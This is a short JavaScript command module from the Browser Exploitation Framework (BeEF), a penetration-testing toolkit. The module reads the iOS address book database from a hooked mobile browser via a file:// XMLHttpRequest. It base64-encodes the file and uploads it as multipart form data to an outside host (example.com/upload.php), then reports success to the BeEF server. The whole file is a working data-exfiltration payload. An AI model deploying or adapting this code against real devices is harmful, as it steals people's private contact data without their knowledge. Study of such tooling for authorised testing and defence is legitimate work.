//
// Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//
beef.execute(function() {

	x = new XMLHttpRequest;
	x.open("get","file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb");
	x.overrideMimeType("text/plain; charset=x-user-defined");
	x.send();
		
	x.onreadystatechange = function() {
		if(x.readyState == 4){
			a = x.responseText || "";
			ff=[];
			mx=a.length;
			scc = String.fromCharCode;
		}		
		for(var z = 0 ; z < mx ; z++){
			ff[z] = scc(a.charCodeAt(z)&255);
		}
		
		b=ff.join("");
		b=btoa(b);
		xp = new XMLHttpRequest;
		xp.open("post","http://example.com/upload.php",!0);
		xp.setRequestHeader("Content-Type","multipart/form-data;boundary=xxx,");
		a = "--xxx\r\nContent-Disposition:form-data;name=\"media\";filename=\"ios.sqlitedb\"\r\nContent-Type:application/octet-stream\r\n\r\n"+b+"\r\n--xxx--";
		xp.send(a);
	};
	
	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'SQL file sent');

});

